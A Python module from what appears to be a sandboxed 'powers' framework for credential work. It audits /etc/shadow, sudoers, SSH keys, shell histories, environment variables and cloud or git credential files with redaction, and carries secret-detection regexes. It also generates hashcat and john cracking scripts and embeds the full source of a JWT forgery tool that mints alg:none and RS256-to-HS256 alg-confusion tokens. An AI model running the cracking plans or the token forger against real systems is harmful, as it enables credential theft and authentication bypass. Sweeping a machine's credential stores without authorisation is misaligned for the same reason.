#!/usr/bin/env python3
"""SSB ULTRA wave-expansion module: nm20.cred.*

Credential & token wave powers. Mix of REAL safe actions (read-only audits of
the sandbox user's own auth material, real key generation, real JWT/hash
parsing, honest-permission /etc/shadow probing) and artifact generators
(SAM/LSASS/DPAPI/Kerberos tooling sources). Dangerous paths default to
armed=false and only emit artifacts/report intent. No private key material is
ever exfiltrated; secrets are always redacted before appearing in results.
"""
import base64
import glob
import hashlib
import hmac
import json
import math
import os
import re
import stat
import subprocess
import sys
import time

DOMAIN = "cred"
_PLATFORM = sys.platform
_TMP = "/tmp"


def _res(power, ok, **kw):
    d = {"ok": bool(ok), "power": power, "platform": _PLATFORM}
    d.update(kw)
    return d


def _name(short):
    return "nm20.cred.%s" % short


def _redact(value, keep_head=4, keep_tail=2):
    """Redact the middle of a secret; keep tiny hints for identification."""
    if value is None:
        return None
    s = str(value)
    if len(s) <= keep_head + keep_tail + 3:
        return s[0:1] + "***" if s else ""
    return "%s%s%s" % (s[:keep_head], "*" * min(len(s) - keep_head - keep_tail, 24),
                       s[-keep_tail:] if keep_tail else "")


def _read_file(path, limit=65536):
    try:
        with open(path, "r", errors="replace") as fh:
            return fh.read(limit), None
    except Exception as exc:  # noqa: BLE001 - report honestly
        return None, str(exc)


def _run(cmd, timeout=20, input_text=None):
    """Run a command; return (rc, stdout, stderr). Never raises."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           input=input_text)
        return p.returncode, p.stdout, p.stderr
    except FileNotFoundError:
        return None, "", "not found: %s" % cmd[0]
    except Exception as exc:  # noqa: BLE001
        return None, "", str(exc)


def _write_artifact(path, content, mode=0o644):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w") as fh:
            fh.write(content)
        os.chmod(path, mode)
        return None
    except Exception as exc:  # noqa: BLE001
        return str(exc)


def _stat_info(path):
    try:
        st = os.stat(path)
        return {
            "mode": oct(stat.S_IMODE(st.st_mode)),
            "uid": st.st_uid,
            "gid": st.st_gid,
            "size": st.st_size,
        }
    except Exception as exc:  # noqa: BLE001
        return {"error": str(exc)}


# --------------------------------------------------------------------------
# REAL audit powers
# --------------------------------------------------------------------------

def p_shadow_audit(args):
    """REAL: attempt to read /etc/shadow; report permission state and redacted entry metadata honestly."""
    power = _name("shadow_audit")
    out = {"target": "/etc/shadow", "euid": os.geteuid() if hasattr(os, "geteuid") else None}
    out["file"] = _stat_info("/etc/shadow")
    data, err = _read_file("/etc/shadow", 1 << 20)
    if data is None:
        out["readable"] = False
        out["error"] = err
        out["honest_note"] = "permission denied or missing; root is required to read shadow hashes"
        return _res(power, True, **out)
    out["readable"] = True
    entries = []
    weak = []
    for line in data.splitlines():
        if not line or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) < 2:
            continue
        user, hsh = parts[0], parts[1]
        ent = {"user": user, "hash_field_state": None}
        if hsh in ("", "!"):
            ent["hash_field_state"] = "locked-or-empty"
            weak.append({"user": user, "issue": "empty-or-locked hash field"})
        elif hsh in ("*", "!!"):
            ent["hash_field_state"] = "no-password-login"
        else:
            algo = {1: "md5crypt", 5: "sha256crypt", 6: "sha512crypt"}.get(
                int(hsh[1]) if hsh.startswith("$") and len(hsh) > 2 and hsh[1].isdigit() else -1)
            if hsh.startswith("$y$"):
                algo = "yescrypt"
            ent["hash_field_state"] = "hashed"
            ent["algo"] = algo or ("unknown-prefix" if hsh.startswith("$") else "legacy-des")
            ent["hash_preview"] = _redact(hsh, 3, 0)
            ent["hash_len"] = len(hsh)
            if algo in ("md5crypt", None, "legacy-des"):
                weak.append({"user": user, "issue": "weak hash algorithm: %s" % (algo or "des")})
        entries.append(ent)
    out["entry_count"] = len(entries)
    out["entries"] = entries[:100]
    out["weak_findings"] = weak
    return _res(power, True, **out)


def p_passwd_analyzer(args):
    """REAL: parse /etc/passwd for uid0 accounts, empty password fields, and login shells."""
    power = _name("passwd_analyzer")
    data, err = _read_file("/etc/passwd", 1 << 20)
    if data is None:
        return _res(power, False, error=err)
    uid0, empty_pw, shell_users, accounts = [], [], [], []
    for line in data.splitlines():
        if not line or line.startswith("#"):
            continue
        p = line.split(":")
        if len(p) < 7:
            continue
        name, pw, uid, shell = p[0], p[1], p[2], p[6]
        try:
            uid_i = int(uid)
        except ValueError:
            continue
        accounts.append(name)
        if uid_i == 0:
            uid0.append(name)
        if pw == "":
            empty_pw.append(name)
        if shell.rstrip() not in ("/usr/sbin/nologin", "/sbin/nologin", "/bin/false", ""):
            shell_users.append({"user": name, "uid": uid_i, "shell": shell})
    anomalies = []
    non_root_uid0 = [u for u in uid0 if u != "root"]
    if non_root_uid0:
        anomalies.append({"issue": "non-root uid 0 accounts", "users": non_root_uid0})
    if empty_pw:
        anomalies.append({"issue": "empty password field (pw stored elsewhere or none)",
                          "users": empty_pw[:50]})
    return _res(power, True, total_accounts=len(accounts), uid0_accounts=uid0,
                empty_password_fields=empty_pw[:50], interactive_shells=shell_users[:100],
                anomalies=anomalies)


def p_ssh_key_audit(args):
    """REAL: scan ~/.ssh for keys; report key types, comments, perms — never private key bytes."""
    power = _name("ssh_key_audit")
    sshdir = os.path.expanduser(args.get("ssh_dir", "~/.ssh"))
    out = {"ssh_dir": sshdir, "exists": os.path.isdir(sshdir)}
    if not out["exists"]:
        out["honest_note"] = "no ~/.ssh directory for this user"
        return _res(power, True, **out)
    keys, other = [], []
    for pth in sorted(glob.glob(os.path.join(sshdir, "*"))):
        base = os.path.basename(pth)
        info = _stat_info(pth)
        rec = {"path": pth, "name": base, "mode": info.get("mode"), "size": info.get("size")}
        if base.endswith(".pub"):
            data, err = _read_file(pth, 4096)
            if data:
                parts = data.split(None, 2)
                rec["key_type"] = parts[0] if parts else "unknown"
                rec["comment"] = parts[2].strip() if len(parts) > 2 else ""
                rec["public_blob_b64_len"] = len(parts[1]) if len(parts) > 1 else 0
            else:
                rec["error"] = err
            keys.append(rec)
        elif base in ("authorized_keys", "authorized_keys2", "known_hosts",
                      "known_hosts2", "config"):
            data, _ = _read_file(pth, 1 << 16)
            rec["line_count"] = len(data.splitlines()) if data else 0
            if base.startswith("known_hosts") and data:
                rec["hashed_hosts"] = sum(1 for ln in data.splitlines() if ln.startswith("|1|"))
            other.append(rec)
        else:
            head, _ = _read_file(pth, 256)
            if head and "PRIVATE KEY" in head:
                rec["kind"] = "private_key"
                # Identify type from the header line only; never expose key bytes.
                m = re.search(r"-----BEGIN ([A-Z0-9 ]*PRIVATE KEY)-----", head)
                rec["key_type"] = m.group(1) if m else "unknown"
                rec["exfiltrated"] = False
                if info.get("mode") not in (None,) and stat.S_IMODE(os.stat(pth).st_mode) & 0o077:
                    rec["warning"] = "private key permissions too open (want 0600)"
            else:
                rec["kind"] = "unknown"
            keys.append(rec)
    out["keys"] = keys
    out["other_files"] = other
    out["key_count"] = len(keys)
    out["policy"] = "metadata only; private key material is never read beyond its header"
    return _res(power, True, **out)


def p_ssh_keygen(args):
    """REAL: generate a fresh ed25519 keypair into /tmp via ssh-keygen (metadata reported only)."""
    power = _name("ssh_keygen")
    ktype = args.get("type", "ed25519")
    base = os.path.join(_TMP, "ssb_cred_key_%d" % os.getpid())
    comment = args.get("comment", "ssb-cred-wave")
    bits = str(args.get("bits", 2048)) if ktype == "rsa" else None
    cmd = ["ssh-keygen", "-t", ktype, "-f", base, "-N", "", "-C", comment, "-q"]
    if bits:
        cmd[2:2] = ["-b", bits]
    rc, stdout, stderr = _run(cmd, timeout=30)
    if rc != 0:
        return _res(power, False, error=(stderr or "ssh-keygen unavailable").strip(),
                    cmd=cmd, honest_note="needs the openssh client tools installed")
    pub, _ = _read_file(base + ".pub", 4096)
    fp_rc, fp_out, _ = _run(["ssh-keygen", "-lf", base + ".pub"])
    priv_info = _stat_info(base)
    return _res(power, True, key_type=ktype, private_key_path=base,
                public_key_path=base + ".pub", public_key=(pub or "").strip(),
                fingerprint=fp_out.strip() if fp_rc == 0 else None,
                private_key_mode=priv_info.get("mode"),
                note="real keypair generated in /tmp; private key bytes not included in result")


def p_history_miner(args):
    """REAL: mine ~/.bash_history (and zsh history) for password-looking tokens, redacted."""
    power = _name("history_miner")
    paths = args.get("paths") or [os.path.expanduser("~/.bash_history"),
                                  os.path.expanduser("~/.zsh_history"),
                                  os.path.expanduser("~/.python_history")]
    pats = [
        re.compile(r"(?i)(password|passwd|pwd|pass|token|api[_-]?key|secret|credential)"
                   r"\s*[=:]\s*['\"]?([^\s'\"]{4,})"),
        re.compile(r"(?i)\b(mysql|psql|mongo|redis-cli)\b.*?\s-p\s*([^\s]{3,})"),
        re.compile(r"(?i)(AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\s*[= ]\s*([A-Za-z0-9/+=]{8,})"),
        re.compile(r"(ghp_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|sk-[A-Za-z0-9]{20,})"),
        re.compile(r"(?i)(sshpass\s+-p)\s*'?([^\s']+)"),
        re.compile(r"(?i)curl[^\n]*?-u\s+([^\s:]+:[^\s]+)"),
    ]
    findings, scanned = [], {}
    for pth in paths:
        data, err = _read_file(pth, 4 << 20)
        if data is None:
            scanned[pth] = {"error": err}
            continue
        lines = data.splitlines()
        scanned[pth] = {"lines": len(lines)}
        for i, line in enumerate(lines):
            for pat in pats:
                for m in pat.finditer(line):
                    secret = m.group(m.lastindex)
                    findings.append({
                        "file": pth, "line": i + 1,
                        "pattern": pat.pattern[:48],
                        "secret_redacted": _redact(secret),
                        "secret_len": len(secret),
                        "context_redacted": _redact(line.strip(), 12, 6),
                    })
                    break  # one hit per line per pattern family is enough
            if len(findings) >= 500:
                break
    return _res(power, True, files_scanned=scanned, finding_count=len(findings),
                findings=findings[:200],
                policy="secrets redacted; middle characters masked")


def p_env_secret_scan(args):
    """REAL: scan this process environment for TOKEN/KEY/SECRET/PASS-style variables, redacted."""
    power = _name("env_secret_scan")
    rx = re.compile(r"(?i)(TOKEN|KEY|SECRET|PASS|PWD|AUTH|CRED|COOKIE|SESSION)")
    extra = args.get("pattern")
    if extra:
        try:
            rx = re.compile(extra, re.I)
        except re.error as exc:
            return _res(power, False, error="bad regex: %s" % exc)
    hits, clean = [], 0
    for name in sorted(os.environ):
        if rx.search(name):
            val = os.environ.get(name, "")
            hits.append({"name": name, "value_redacted": _redact(val), "value_len": len(val)})
        else:
            clean += 1
    return _res(power, True, total_env=len(os.environ), suspicious=len(hits),
                matches=hits[:200], non_matching=clean,
                policy="values redacted; names only for triage")


_SECRET_REGEXES = {
    "aws_access_key_id": re.compile(r"\b(AKIA|ASIA)[0-9A-Z]{16}\b"),
    "aws_secret_key": re.compile(r"(?i)aws_secret_access_key\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})"),
    "github_token": re.compile(r"\b(ghp_[A-Za-z0-9]{36,255}|gho_[A-Za-z0-9]{36,255}|"
                               r"ghu_[A-Za-z0-9]{36,255}|ghs_[A-Za-z0-9]{36,255}|"
                               r"ghr_[A-Za-z0-9]{36,255}|github_pat_[A-Za-z0-9_]{22,255})\b"),
    "jwt": re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{4,}\b"),
    "private_key_block": re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY(?: BLOCK)?-----"),
    "slack_token": re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"),
    "google_api_key": re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b"),
    "generic_password": re.compile(r"(?i)(password|passwd|pwd|secret|api[_-]?key|token)"
                                   r"\s*[=:]\s*['\"]([^'\"]{6,})['\"]"),
    "hex_secret_32plus": re.compile(r"\b[0-9a-fA-F]{32,64}\b"),
}


def p_file_secret_scan(args):
    """REAL: regex-scan a small text file (arg path) for AWS/GitHub/JWT/private-key patterns, redacted."""
    power = _name("file_secret_scan")
    path = args.get("path")
    if not path:
        return _res(power, False, error="missing args.path",
                    usage={"path": "/path/to/file.txt", "max_bytes": 1048576})
    max_bytes = int(args.get("max_bytes", 1 << 20))
    try:
        size = os.path.getsize(path)
    except Exception as exc:  # noqa: BLE001
        return _res(power, False, error=str(exc), path=path)
    if size > max_bytes:
        return _res(power, False, error="file too large (%d > %d bytes); refusing by policy"
                    % (size, max_bytes), path=path)
    data, err = _read_file(path, max_bytes)
    if data is None:
        return _res(power, False, error=err, path=path)
    findings = []
    for lineno, line in enumerate(data.splitlines(), 1):
        for kind, rx in _SECRET_REGEXES.items():
            for m in rx.finditer(line):
                token = m.group(0)
                if m.lastindex and kind == "generic_password":
                    token = m.group(m.lastindex)
                findings.append({"kind": kind, "line": lineno,
                                 "match_redacted": _redact(token), "match_len": len(token)})
        if len(findings) >= 500:
            break
    by_kind = {}
    for f in findings:
        by_kind[f["kind"]] = by_kind.get(f["kind"], 0) + 1
    return _res(power, True, path=path, bytes_scanned=min(size, max_bytes),
                finding_count=len(findings), by_kind=by_kind, findings=findings[:200],
                policy="matches redacted in results")


def p_cred_store_audit(args):
    """REAL: look for ~/.netrc, ~/.git-credentials and friends; report presence with redacted contents."""
    power = _name("cred_store_audit")
    home = os.path.expanduser("~")
    stores = {
        "netrc": os.path.join(home, ".netrc"),
        "git_credentials": os.path.join(home, ".git-credentials"),
        "aws_credentials": os.path.join(home, ".aws", "credentials"),
        "docker_config": os.path.join(home, ".docker", "config.json"),
        "kube_config": os.path.join(home, ".kube", "config"),
        "vault_token": os.path.join(home, ".vault-token"),
        "npmrc": os.path.join(home, ".npmrc"),
        "pypirc": os.path.join(home, ".pypirc"),
    }
    found, missing = [], []
    for name, pth in stores.items():
        if not os.path.exists(pth):
            missing.append(name)
            continue
        rec = {"store": name, "path": pth}
        rec.update(_stat_info(pth))
        data, err = _read_file(pth, 1 << 16)
        if data is None:
            rec["error"] = err
        else:
            rec["line_count"] = len(data.splitlines())
            if name == "netrc":
                machines = re.findall(r"(?m)^\s*machine\s+(\S+)", data)
                logins = re.findall(r"(?m)^\s*login\s+(\S+)", data)
                rec["machines"] = machines[:50]
                rec["logins"] = [_redact(l, 2, 1) for l in logins[:50]]
                rec["passwords_present"] = len(re.findall(r"(?m)^\s*password\s+\S+", data))
            elif name == "git_credentials":
                hosts = []
                for ln in data.splitlines():
                    m = re.match(r"https?://([^:/]+):([^@]+)@(.+)", ln.strip())
                    if m:
                        hosts.append({"user": _redact(m.group(1), 2, 1),
                                      "password": _redact(m.group(2)),
                                      "host": m.group(3)})
                    elif ln.strip():
                        hosts.append({"raw_redacted": _redact(ln.strip(), 10, 4)})
                rec["entries"] = hosts[:50]
            elif name == "aws_credentials":
                rec["profiles"] = re.findall(r"(?m)^\[(.+)\]", data)
                rec["has_secret_keys"] = "aws_secret_access_key" in data
            elif name == "docker_config":
                rec["auths"] = list((json.loads(data).get("auths") or {}).keys()) \
                    if data.strip().startswith("{") else []
            elif name == "vault_token":
                rec["token_redacted"] = _redact(data.strip())
            if rec.get("mode") and name in ("netrc", "aws_credentials"):
                try:
                    if stat.S_IMODE(os.stat(pth).st_mode) & 0o077:
                        rec["warning"] = "permissions too open (want 0600)"
                except OSError:
                    pass
        found.append(rec)
    return _res(power, True, found_count=len(found), stores=found, absent=missing,
                policy="credential values redacted; structure only")


def p_vault_probe(args):
    """REAL: check for common local vault/secret-store files (gnome-keyring, keepass, pass, gcloud, azure)."""
    power = _name("vault_probe")
    home = os.path.expanduser("~")
    candidates = {
        "gnome_keyring": [os.path.join(home, ".local/share/keyrings/*.keyring")],
        "kde_wallet": [os.path.join(home, ".local/share/kwalletd/*.kwl")],
        "password_store": [os.path.join(home, ".password-store")],
        "keepass_db": [os.path.join(home, "*.kdbx"), os.path.join(home, "Documents", "*.kdbx"),
                       os.path.join(home, "KeePass", "*.kdbx")],
        "keepassxc_config": [os.path.join(home, ".config/keepassxc/keepassxc.ini")],
        "gcloud_config": [os.path.join(home, ".config/gcloud")],
        "azure_profile": [os.path.join(home, ".azure")],
        "kube_config": [os.path.join(home, ".kube/config")],
        "hashicorp_vault_token": [os.path.join(home, ".vault-token")],
        "1password_dir": [os.path.join(home, ".1password"), os.path.join(home, ".config/1Password")],
        "bitwarden_dir": [os.path.join(home, ".config/Bitwarden")],
        "gnupg": [os.path.join(home, ".gnupg")],
        "local_vault_service": ["/etc/vault", "/etc/vault.d"],
    }
    hits = []
    for kind, pats in candidates.items():
        for pat in pats:
            for pth in sorted(glob.glob(pat)):
                rec = {"kind": kind, "path": pth,
                       "is_dir": os.path.isdir(pth)}
                rec.update(_stat_info(pth))
                if os.path.isdir(pth):
                    try:
                        rec["entry_count"] = len(os.listdir(pth))
                    except OSError as exc:
                        rec["error"] = str(exc)
                hits.append(rec)
    return _res(power, True, vault_artifacts_found=len(hits), artifacts=hits[:200],
                note="presence/metadata only; no vault decryption attempted")


def p_sudoers_audit(args):
    """REAL: attempt to read /etc/sudoers and /etc/sudoers.d; report permission state and NOPASSWD lines."""
    power = _name("sudoers_audit")
    targets = ["/etc/sudoers"] + sorted(glob.glob("/etc/sudoers.d/*"))[:50]
    files, nopasswd, all_rules = [], [], []
    for pth in targets:
        rec = {"path": pth}
        rec.update(_stat_info(pth))
        data, err = _read_file(pth, 1 << 16)
        if data is None:
            rec["readable"] = False
            rec["error"] = err
        else:
            rec["readable"] = True
            for ln in data.splitlines():
                s = ln.strip()
                if not s or s.startswith("#"):
                    continue
                all_rules.append({"file": pth, "rule": s[:200]})
                if "NOPASSWD" in s:
                    nopasswd.append({"file": pth, "rule": s[:200]})
        files.append(rec)
    readable = [f["path"] for f in files if f.get("readable")]
    return _res(power, True, files=files, readable_count=len(readable),
                nopasswd_rules=nopasswd[:100], rule_sample=all_rules[:100],
                honest_note="unreadable files need root; state reported per-file")


# --------------------------------------------------------------------------
# REAL parsing / generation powers
# --------------------------------------------------------------------------

def _b64url_decode(seg):
    seg = seg.encode() if isinstance(seg, str) else seg
    pad = b"=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def p_jwt_decoder(args):
    """REAL: decode a JWT header/payload (no signature verification) and flag risky algs."""
    power = _name("jwt_decoder")
    token = (args.get("token") or "").strip()
    if not token:
        return _res(power, False, error="missing args.token")
    parts = token.split(".")
    if len(parts) not in (2, 3):
        return _res(power, False, error="not a JWT: expected 2-3 dot segments, got %d" % len(parts))
    out = {"segments": len(parts)}
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except Exception as exc:  # noqa: BLE001
        return _res(power, False, error="header decode failed: %s" % exc)
    out["header"] = header
    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as exc:  # noqa: BLE001
        out["payload_error"] = str(exc)
        payload = None
    out["payload"] = payload
    out["signature_present"] = len(parts) == 3 and bool(parts[2])
    out["signature_len"] = len(parts[2]) if len(parts) == 3 else 0
    alg = str(header.get("alg", "")).lower()
    warnings = []
    if alg == "none":
        warnings.append("alg=none: unsigned token; trivially forgeable if accepted")
    if alg.startswith("hs") :
        warnings.append("symmetric HMAC alg: vulnerable to alg-confusion if verifier also trusts RS*")
    if payload:
        now = int(time.time())
        for claim in ("exp", "nbf", "iat"):
            if claim in payload:
                out.setdefault("times", {})[claim] = payload[claim]
        if isinstance(payload.get("exp"), (int, float)):
            out["expired"] = payload["exp"] < now
    out["warnings"] = warnings
    out["verification"] = "none performed — decode only, signature NOT validated"
    return _res(power, True, **out)


def p_hash_identify(args):
    """REAL: classify a hash string by length, charset and prefix into likely algorithms."""
    power = _name("hash_identify")
    h = (args.get("hash") or "").strip()
    if not h:
        return _res(power, False, error="missing args.hash")
    candidates = []
    prefix_map = [
        (r"^\$2[aby]\$\d{2}\$", "bcrypt", "3200"),
        (r"^\$1\$", "md5crypt", "500"),
        (r"^\$5\$", "sha256crypt", "7400"),
        (r"^\$6\$", "sha512crypt", "1800"),
        (r"^\$y\$", "yescrypt", "yescrypt"),
        (r"^\$argon2i", "argon2i", "argon2"),
        (r"^\$argon2id", "argon2id", "argon2"),
        (r"^\$apr1\$", "apache-md5", "1600"),
        (r"^\$krb5", "kerberos-5-hash", "john-only"),
        (r"^\$mysql", "mysql", "john-only"),
    ]
    for pat, name, mode in prefix_map:
        if re.match(pat, h):
            candidates.append({"algorithm": name, "hashcat_mode": mode, "evidence": "prefix"})
    is_hex = bool(re.fullmatch(r"[0-9a-fA-F]+", h))
    is_b64ish = bool(re.fullmatch(r"[A-Za-z0-9+/=]+", h))
    if is_hex:
        length_map = {
            32: [("md5", "0"), ("ntlm", "1000"), ("md4", "900"), ("lm-half", "3000")],
            40: [("sha1", "100"), ("ripemd160", "6000"), ("mysql5", "300")],
            56: [("sha224", "1300"), ("sha3-224", "17300")],
            64: [("sha256", "1400"), ("sha3-256", "17400"), ("blake2s-256", "blake2s")],
            96: [("sha384", "10800"), ("sha3-384", "17500")],
            128: [("sha512", "1700"), ("sha3-512", "17600"), ("whirlpool", "6100")],
            16: [("mysql-old", "200"), ("md5-half", "5100")],
        }
        for name, mode in length_map.get(len(h), []):
            candidates.append({"algorithm": name, "hashcat_mode": mode,
                               "evidence": "hex length %d" % len(h)})
    elif is_b64ish and not candidates:
        candidates.append({"algorithm": "base64-encoded digest (decode then re-identify)",
                           "hashcat_mode": None, "evidence": "base64 charset"})
    if h.startswith("eyJ") and h.count(".") == 2:
        candidates.insert(0, {"algorithm": "JWT (not a password hash)", "hashcat_mode": "16500",
                              "evidence": "eyJ prefix + 3 segments"})
    return _res(power, True, length=len(h), hex=is_hex,
                candidates=candidates or [{"algorithm": "unknown", "evidence": "no rule matched"}],
                confidence="heuristic: length/charset cannot uniquely identify a hash")


def p_hash_crack_gen(args):
    """REAL planner: identify a hash and emit ready-to-run hashcat/john command lines."""
    power = _name("hash_crack_gen")
    h = (args.get("hash") or "").strip()
    if not h:
        return _res(power, False, error="missing args.hash")
    ident = p_hash_identify({"hash": h})
    top = ident["candidates"][0]
    mode = top.get("hashcat_mode")
    wordlist = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    plans = []
    if mode and str(mode).isdigit():
        plans.append("hashcat -m %s -a 0 hash.txt %s" % (mode, wordlist))
        plans.append("hashcat -m %s -a 0 -r /usr/share/hashcat/rules/best64.rule hash.txt %s"
                     % (mode, wordlist))
        plans.append("hashcat -m %s -a 3 hash.txt ?a?a?a?a?a?a?a  # brute force <=7" % mode)
    plans.append("john --wordlist=%s hash.txt" % wordlist)
    plans.append("john --format=%s --wordlist=%s hash.txt" % (top.get("algorithm", "raw-md5"), wordlist))
    plans.append("john --show hash.txt  # after cracking")
    script = "#!/bin/sh\n# SSB cred wave: hash cracking plan for %s\nset -e\necho '%s' > hash.txt\n%s\n" % (
        top.get("algorithm", "unknown"), h, "\n".join(plans[:3]))
    path = os.path.join(_TMP, "ssb_cred_hashcrack_plan.sh")
    err = _write_artifact(path, script, 0o755)
    out = {"hash_len": len(h), "top_candidate": top, "all_candidates": ident["candidates"],
           "commands": plans}
    if err:
        out["artifact_error"] = err
    else:
        out["artifact"] = path
    out["note"] = "planner only; no cracker executed"
    return _res(power, True, **out)


def p_token_scope_probe(args):
    """REAL: probe a GitHub token's scopes via the documented /rate_limit endpoint; honest if offline."""
    power = _name("token_scope_probe")
    token = (args.get("token") or "").strip()
    if not token:
        return _res(power, False, error="missing args.token",
                    usage={"token": "ghp_... or github_pat_...",
                           "note": "token is used once for one HTTPS request and never stored"})
    kind = ("fine-grained PAT" if token.startswith("github_pat_")
            else "oauth token" if token.startswith(("gho_", "ghu_"))
            else "classic PAT" if token.startswith("ghp_")
            else "server-to-server" if token.startswith("ghs_")
            else "unknown-format")
    import urllib.request
    import urllib.error
    req = urllib.request.Request(
        "https://api.github.com/rate_limit",
        headers={"Authorization": "Bearer %s" % token,
                 "Accept": "application/vnd.github+json",
                 "User-Agent": "ssb-cred-scope-probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            body = json.loads(resp.read().decode("utf-8", "replace"))
            headers = dict(resp.headers)
    except urllib.error.HTTPError as exc:
        return _res(power, True, token_kind=kind, token_redacted=_redact(token),
                    http_status=exc.code,
                    valid=exc.code not in (401, 403),
                    honest_note="GitHub answered; token rejected" if exc.code == 401
                    else "HTTP error %s" % exc.code)
    except Exception as exc:  # noqa: BLE001
        return _res(power, True, token_kind=kind, token_redacted=_redact(token),
                    network="unavailable", error=str(exc),
                    honest_note="no network egress from this sandbox; scope check not performed")
    rate = (body.get("resources") or {}).get("core") or {}
    return _res(power, True, token_kind=kind, token_redacted=_redact(token), valid=True,
                scopes=(headers.get("X-OAuth-Scopes") or "").split(", ") if headers.get("X-OAuth-Scopes") else [],
                rate_limit=rate.get("limit"), rate_remaining=rate.get("remaining"),
                rate_reset_epoch=rate.get("reset"),
                note="scopes only reported for classic PATs; fine-grained PATs omit X-OAuth-Scopes by design")


_COMMON_PASSWORDS = {
    "password", "123456", "123456789", "qwerty", "abc123", "password1", "111111",
    "letmein", "iloveyou", "dragon", "monkey", "football", "admin", "welcome",
    "login", "princess", "starwars", "whatever", "trustno1", "12345678", "1234567",
    "sunshine", "master", "shadow", "superman", "michael", "hunter", "secret",
}


def p_password_strength(args):
    """REAL: zxcvbn-style entropy scorer — charset pool, pattern penalties, crack-time estimates."""
    power = _name("password_strength")
    pw = args.get("password")
    if pw is None:
        return _res(power, False, error="missing args.password")
    pool = 0
    pool += 26 if re.search(r"[a-z]", pw) else 0
    pool += 26 if re.search(r"[A-Z]", pw) else 0
    pool += 10 if re.search(r"[0-9]", pw) else 0
    pool += 33 if re.search(r"[^a-zA-Z0-9]", pw) else 0
    raw_entropy = len(pw) * math.log2(pool) if pool else 0.0
    penalties = []
    lowered = pw.lower()
    if lowered in _COMMON_PASSWORDS:
        penalties.append(("dictionary/common password", 0.85))
    if re.search(r"(.)\1{2,}", pw):
        penalties.append(("repeated characters", 0.25))
    if re.search(r"(?:0123|1234|2345|3456|4567|5678|6789|abcd|qwer|asdf)", lowered):
        penalties.append(("keyboard/sequential run", 0.35))
    if re.match(r"^[A-Z][a-z]+\d{1,4}[!@#$]?$", pw):
        penalties.append(("Capitalized-word+digits+symbol pattern", 0.45))
    factor = 1.0
    for _, f in penalties:
        factor *= (1.0 - f)
    entropy = raw_entropy * factor
    guesses = 2.0 ** max(entropy, 1.0)
    rates = {"online_throttled_100_s": 1e2, "online_unthrottled_10k_s": 1e4,
             "offline_fast_hash_100G_s": 1e11, "offline_slow_bcrypt_100k_s": 1e5}
    crack_times = {}
    for label, rate in rates.items():
        secs = guesses / rate
        crack_times[label] = ("instant" if secs < 1 else
                              "%.1f sec" % secs if secs < 60 else
                              "%.1f min" % (secs / 60) if secs < 3600 else
                              "%.1f hours" % (secs / 3600) if secs < 86400 else
                              "%.1f days" % (secs / 86400) if secs < 86400 * 365 else
                              "%.1f years" % (secs / (86400 * 365)))
    score = 0 if entropy < 28 else 1 if entropy < 36 else 2 if entropy < 50 else 3 if entropy < 70 else 4
    verdict = ["very weak", "weak", "fair", "strong", "very strong"][score]
    return _res(power, True, length=len(pw), charset_pool=pool,
                raw_entropy_bits=round(raw_entropy, 1),
                effective_entropy_bits=round(entropy, 1),
                penalties=[p[0] for p in penalties], score_0_to_4=score, verdict=verdict,
                crack_time_estimates=crack_times,
                policy="password scored in memory; not logged or stored")


# --------------------------------------------------------------------------
# Artifact generators (dangerous-by-design; armed=false default)
# --------------------------------------------------------------------------

_JWT_FORGE_SRC = r'''#!/usr/bin/env python3
"""SSB cred-wave artifact: JWT signing / alg-confusion tester (stdlib only).

Modes:
  selftest            forge unsigned 'alg:none' token + HS256 token with a weak
                      secret and verify them locally (offline, safe).
  none <payload-json> emit an alg=none token for the given claims.
  hs256 <secret> <payload-json>
                      emit an HS256-signed token.
  confuse <pubkey.pem> <payload-json>
                      emit an RS256->HS256 alg-confusion token signed with the
                      PUBLIC key as HMAC secret (works against naive verifiers).
Usage: python3 jwt_forge.py <mode> [args...]
"""
import base64, hashlib, hmac, json, sys


def b64u(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make(header, payload, secret=None, alg="HS256"):
    head = dict(header)
    head["alg"] = alg
    signing = b64u(json.dumps(head, separators=(",", ":"))) + "." + \
        b64u(json.dumps(payload, separators=(",", ":")))
    if alg == "none":
        return signing + "."
    if alg == "HS256":
        sig = hmac.new(secret if isinstance(secret, bytes) else secret.encode(),
                       signing.encode(), hashlib.sha256).digest()
        return signing + "." + b64u(sig)
    raise SystemExit("alg %s not supported by this tester" % alg)


def verify_hs256(token, secret):
    head_b64, pay_b64, sig_b64 = token.split(".")
    expect = hmac.new(secret.encode(), (head_b64 + "." + pay_b64).encode(),
                      hashlib.sha256).digest()
    pad = "=" * (-len(sig_b64) % 4)
    got = base64.urlsafe_b64decode(sig_b64 + pad)
    return hmac.compare_digest(expect, got)


def main(argv):
    mode = argv[1] if len(argv) > 1 else "selftest"
    if mode == "selftest":
        payload = {"sub": "ssb-test", "admin": True}
        none_tok = make({}, payload, alg="none")
        hs_tok = make({}, payload, secret="secret123", alg="HS256")
        print(json.dumps({
            "alg_none_token": none_tok,
            "hs256_token_redacted": hs_tok[:40] + "...",
            "hs256_verifies_with_weak_secret": verify_hs256(hs_tok, "secret123"),
            "note": "offline self-test only; no verifier contacted",
        }, indent=2))
    elif mode == "none":
        print(make({}, json.loads(argv[2]), alg="none"))
    elif mode == "hs256":
        print(make({}, json.loads(argv[3]), secret=argv[2], alg="HS256"))
    elif mode == "confuse":
        with open(argv[2], "rb") as fh:
            pubkey = fh.read()
        print(make({}, json.loads(argv[3]), secret=pubkey, alg="HS256"))
    else:
        raise SystemExit(__doc__)


if __name__ == "__main__":
    main(sys.argv)
'''


